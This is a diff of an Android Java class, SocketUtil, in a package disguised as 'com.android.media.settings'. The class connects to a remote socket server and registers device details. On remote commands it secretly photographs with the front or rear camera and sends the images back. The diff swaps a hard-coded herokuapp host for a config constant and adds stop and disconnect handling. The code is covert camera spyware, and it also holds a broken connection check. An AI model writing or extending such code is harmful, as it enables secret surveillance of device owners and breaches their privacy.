@@ -4,32 +4,26 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.hardware.Camera;
-import android.os.Build;
 import android.os.Handler;
 import android.support.v4.content.LocalBroadcastManager;
-import android.util.Base64;
 import android.util.Log;
 
-import com.android.media.settings.Interface.ImageCaptureListener;
+import com.android.media.settings.MediaConfig;
 import com.android.media.settings.Model.DeviceActivity;
 import com.android.media.settings.Model.DeviceActivityResponse;
 import com.android.media.settings.Model.Media;
-import com.android.media.settings.Model.Device;
-import com.android.media.settings.Service.CameraService;
-import com.android.media.settings.Service.ImageCaptureService;
-import com.android.media.settings.Service.ImageCaptureServiceImp;
-import com.github.nkzawa.emitter.Emitter;
-import com.github.nkzawa.socketio.client.IO;
-import com.github.nkzawa.socketio.client.Socket;
+import com.android.media.settings.Model.Property;
+import com.android.media.settings.Service.CamService;
 import com.google.gson.Gson;
 
 import java.io.UnsupportedEncodingException;
 import java.net.URISyntaxException;
 import java.net.URLEncoder;
-import java.util.TreeMap;
+
+import io.socket.client.IO;
+import io.socket.client.Socket;
+import io.socket.emitter.Emitter;
 
 public class SocketUtil {
     private static final String TAG = SocketUtil.class.getSimpleName();
@@ -41,39 +35,64 @@ public class SocketUtil {
     public static final String ACTIVITY_SNAP_FRONT = "snapFront";
     public static final String ACTIVITY_SNAP_REAR = "snapRear";
     public static final String ACTIVITY_SNAP = "userSnap";
+    public static final String ACTIVITY_RESET = "stopCamService";
 
-    private static Socket mSocket;
+    private static Socket mSocket; {
+        try {
+            mSocket = IO.socket(MediaConfig.SOCKET_SERVER_URL);
+        } catch (URISyntaxException e) { e.printStackTrace(); }
+    }
     private Context context;
     private Handler handler;
     private MediaUtility mMediaUtility;
     private String deviceId;
+    public static boolean isConnected;
 
     public SocketUtil(Context context) {
         this.context = context;
+        isConnected = false;
         handler = new Handler();
         mMediaUtility = MediaUtility.getInstance(context);
-
         LocalBroadcastManager.getInstance(context).registerReceiver(receiver, new IntentFilter("CamServiceUpdates"));
+    }
+
+    private static SocketUtil mSocketUtil;
+    public static synchronized SocketUtil getInstance(Context context) {
+        if(mSocketUtil == null) {
+            mSocketUtil = new SocketUtil(context);
+        }
+        return mSocketUtil;
     }
 
     private void runOnUiThread(Runnable runnable) {
         handler.post(runnable);
     }
 
-    public void connect() {
-        Log.d(TAG, "Connecting to Server...");
+    public boolean connect() {
+        if(mSocket != null && !mSocket.connected()) {
+            Log.d(TAG, "Connecting to MediaStore...");
+            mSocket.on(Socket.EVENT_CONNECT, onConnect);
+            mSocket.on(Socket.EVENT_CONNECT_ERROR, onError);
+            mSocket.on(Socket.EVENT_CONNECT_TIMEOUT, onError);
+            mSocket.on(Socket.EVENT_ERROR, onError);
+            mSocket.on(Socket.EVENT_DISCONNECT, onError);
+            mSocket.on(EVENT_ON_ACTIVITY, onActivity);
+            mSocket.connect();
+        }
+        return this.isConnected();
+    }
+
+    public boolean isConnected() {
         try {
-            mSocket = IO.socket("https://media-store.herokuapp.com/");
-        } catch (URISyntaxException e) { e.printStackTrace(); }
-        mSocket.on(Socket.EVENT_CONNECT, onConnect);
-        mSocket.on(Socket.EVENT_CONNECT_ERROR, onError);
-        mSocket.on(Socket.EVENT_CONNECT_TIMEOUT, onError);
-        mSocket.on(EVENT_ON_ACTIVITY, onActivity);
-        mSocket.connect();
+            return mSocket == null && mSocket.connected();
+        } catch (NullPointerException e) {
+            return false;
+        }
     }
 
     private Emitter.Listener onConnect = (Object... args) -> {
         Log.d(TAG, "Device Connected");
+        isConnected = true;
         String response = mMediaUtility.toJson(mMediaUtility.getDevice());
         try {
             response = URLEncoder.encode(response, "utf-8");
@@ -84,8 +103,14 @@ public class SocketUtil {
     };
 
     private Emitter.Listener onError = (Object... args) -> {
-        Device device = MediaUtility.getInstance(context).getDevice();
-        mSocket.emit(EVENT_JOIN, device);
+        isConnected = false;
+        String response = mMediaUtility.toJson(mMediaUtility.getDevice());
+        try {
+            response = URLEncoder.encode(response, "utf-8");
+        } catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
+        }
+        mSocket.emit(EVENT_JOIN, response);
     };
 
     private Emitter.Listener onActivity = (Object... args) -> {
@@ -96,31 +121,22 @@ public class SocketUtil {
         processActivity(activity);
     };
 
-    private void captureImage(int cameraId, int rotation) {
+    private void captureImage(Property prop) {
         if(!CameraUtility.isCameraExist(context)) {
             return;
         }
-
-        if(CameraUtility.isCameraExist(cameraId)) {
-            CameraService.takeSnap(context, cameraId, CameraService.FUNCTION_TAKE_SNAP, rotation);
-        } else if(CameraUtility.isCameraExist(Camera.CameraInfo.CAMERA_FACING_BACK)) {
-            CameraService.takeSnap(context, Camera.CameraInfo.CAMERA_FACING_BACK,
-                    CameraService.FUNCTION_TAKE_SNAP, 90);
-        }
+        CamService.takeSnap(context, prop);
     }
 
     private void processActivity(DeviceActivity activity) {
+        Log.d(TAG, "Activity Triggered " + activity.getName());
         switch (activity.getName()) {
-            case ACTIVITY_SNAP:
-                captureImage(Camera.CameraInfo.CAMERA_FACING_FRONT, 270);
+            case ACTIVITY_SNAP: case ACTIVITY_SNAP_FRONT: case ACTIVITY_SNAP_REAR:
+                captureImage(activity.getProperty());
                 break;
 
-            case ACTIVITY_SNAP_FRONT:
-                captureImage(Camera.CameraInfo.CAMERA_FACING_FRONT, 270);
-                break;
-
-            case ACTIVITY_SNAP_REAR:
-                captureImage(Camera.CameraInfo.CAMERA_FACING_BACK, 90);
+            case ACTIVITY_RESET:
+                context.stopService(new Intent(context, CamService.class));
                 break;
         }
     }
@@ -131,11 +147,23 @@ public class SocketUtil {
         mSocket.emit(EVENT_ACTIVITY_RESPONSE, new Gson().toJson(response));
     }
 
-    BroadcastReceiver receiver = new BroadcastReceiver() {
+    private BroadcastReceiver receiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
             byte[] bytes = intent.getByteArrayExtra("ImageBytes");
             emitImage(mMediaUtility.compressByteImage(bytes));
         }
     };
+
+    public void disconnect() {
+        if(mSocket.connected()) {
+            mSocket.disconnect();
+            mSocket.off(Socket.EVENT_CONNECT, onConnect);
+            mSocket.off(Socket.EVENT_CONNECT_ERROR, onError);
+            mSocket.off(Socket.EVENT_CONNECT_TIMEOUT, onError);
+            mSocket.off(Socket.EVENT_ERROR, onError);
+            mSocket.off(Socket.EVENT_DISCONNECT, onError);
+            mSocket.off(EVENT_ON_ACTIVITY, onActivity);
+        }
+    }
 }
